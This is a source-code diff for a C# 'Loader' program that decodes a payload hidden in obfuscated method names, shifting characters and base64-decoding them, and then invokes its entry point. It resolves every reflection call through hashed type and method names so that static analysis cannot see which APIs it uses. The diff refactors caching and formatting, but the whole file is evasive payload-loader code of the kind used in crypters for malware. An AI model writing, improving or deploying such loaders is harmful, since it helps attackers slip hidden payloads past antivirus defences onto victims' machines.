@@ -1,4 +1,4 @@
-﻿#nullable enable
+#nullable enable
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -8,6 +8,14 @@ namespace Loader
 {
     public static unsafe class Loader
     {
+        private static readonly Type[] Types = typeof(void).Assembly.GetTypes();
+
+        private static readonly Dictionary<uint, MethodInfo> MethodCache = new();
+        private static readonly Dictionary<uint, PropertyInfo> PropertyCache = new();
+
+        private static readonly Dictionary<Type?, IEnumerable<MethodInfo>> TypeMethodCache = new();
+        private static readonly Dictionary<Type?, IEnumerable<PropertyInfo>> TypePropertyCache = new();
+
         [STAThread]
         public static void Main(string[] args)
         {
@@ -20,18 +28,22 @@ namespace Loader
             int offset = 0;
             for (int i = 0x1338; i < 0x1339; i++)
             {
-                MethodBase baseMethod = InvokeMethod<MethodBase>(1274687369, 1074927592, new object?[] { i }, module); // System.Reflection.Module.ResolveMethod()
-                string name = GetPropValue<string>(4243846143, 1642051212, baseMethod); // System.Reflection.MethodBase.Name
+                MethodBase baseMethod =
+                    InvokeMethod<MethodBase>(1274687369, 1074927592, new object?[] { i },
+                        module); // System.Reflection.Module.ResolveMethod()
+                string name =
+                    GetPropValue<string>(4243846143, 1642051212, baseMethod); // System.Reflection.MethodBase.Name
                 fixed (char* ptr = name)
                 {
                     int length = GetPropValue<int>(1845477325, 4202415711, name); // System.String.Length
                     for (int j = 0; j < length; j++)
                     {
-                        ptr[j] -= (char)(_methodCache.Keys.ToArray()[0] % 100 - 30);
+                        ptr[j] -= (char)(MethodCache.Keys.ToArray()[0] % 100 - 30);
                     }
 
                     byte[] data = base64FromCharPtr(ptr, length);
-                    InvokeMethod<short>(2132718223, 4285503295, new object?[] { payload, offset }, data); // System.Array.CopyTo
+                    InvokeMethod<short>(2132718223, 4285503295, new object?[] { payload, offset },
+                        data); // System.Array.CopyTo
                     offset += data.Length;
                 }
             }
@@ -61,21 +73,29 @@ namespace Loader
                 entryPoint); // System.Reflection.MethodBase.Invoke(object, object[])
         }
 
-        private static readonly Dictionary<uint, MethodInfo> _methodCache = new();
+        private static Type? GetType(uint typeHash) =>
+            Types.FirstOrDefault(type => GetHash(type.FullName!) == typeHash);
 
-        private static T InvokeMethod<T>(uint typeHash, uint methodHash, object?[]? args = null, object? instance = null)
+        private static T InvokeMethod<T>(uint typeHash, uint methodHash, object?[]? args = null,
+            object? instance = null)
         {
-            if (methodHash != 528465795 && _methodCache.TryGetValue(methodHash, out var info))
+            if (methodHash != 528465795 && MethodCache.TryGetValue(methodHash, out var info))
                 return (T)(info.Invoke(instance, args) ?? default(T))!;
 
-            var typeDef = typeof(void).Assembly.GetTypes()
-                .First(type => GetHash(type.FullName!) == typeHash);
+            var typeDef = GetType(typeHash);
 
-            var methodInfo = typeDef.GetRuntimeMethods()
-                .FirstOrDefault(method => GetHash(method.ToString()) == methodHash);
+            if (!TypeMethodCache.TryGetValue(typeDef, out IEnumerable<MethodInfo> runtimeMethods))
+            {
+                runtimeMethods = typeDef.GetRuntimeMethods();
+                // ReSharper disable once PossibleMultipleEnumeration
+                TypeMethodCache.Add(typeDef, runtimeMethods);
+            }
+
+            // ReSharper disable once PossibleMultipleEnumeration
+            var methodInfo = runtimeMethods.FirstOrDefault(method => GetHash(method.ToString()) == methodHash);
 
             if (methodInfo != null)
-                _methodCache.Add(methodHash, methodInfo);
+                MethodCache.Add(methodHash, methodInfo);
 
             if (methodHash == 528465795) // Hardcoded delegate resolving because Im lazy
                 return (T)(object)Delegate.CreateDelegate(typeof(T), methodInfo!);
@@ -83,21 +103,24 @@ namespace Loader
             return (T)(methodInfo?.Invoke(instance, args) ?? default(T))!;
         }
 
-        private static readonly Dictionary<uint, PropertyInfo> _propertyCache = new();
-
         private static T GetPropValue<T>(uint typeHash, uint propHash, object instance)
         {
-            if (_propertyCache.TryGetValue(propHash, out var prop))
+            if (PropertyCache.TryGetValue(propHash, out var prop))
                 return (T)prop.GetValue(instance);
 
-            var typeDef = typeof(void).Assembly.GetTypes()
-                .First(type => GetHash(type.FullName!) == typeHash);
+            var typeDef = GetType(typeHash);
 
-            var propertyInfo = typeDef.GetRuntimeProperties()
-                .First(method => GetHash(method.Name) == propHash);
+            if (!TypePropertyCache.TryGetValue(typeDef, out IEnumerable<PropertyInfo> runtimeProperties))
+            {
+                runtimeProperties = typeDef.GetRuntimeProperties();
+                // ReSharper disable once PossibleMultipleEnumeration
+                TypePropertyCache.Add(typeDef, runtimeProperties);
+            }
 
-            if (propertyInfo != null)
-                _propertyCache.Add(propHash, propertyInfo);
+            // ReSharper disable once PossibleMultipleEnumeration
+            var propertyInfo = runtimeProperties.First(method => GetHash(method.Name) == propHash);
+
+            PropertyCache.Add(propHash, propertyInfo);
 
             return (T)propertyInfo!.GetValue(instance);
         }
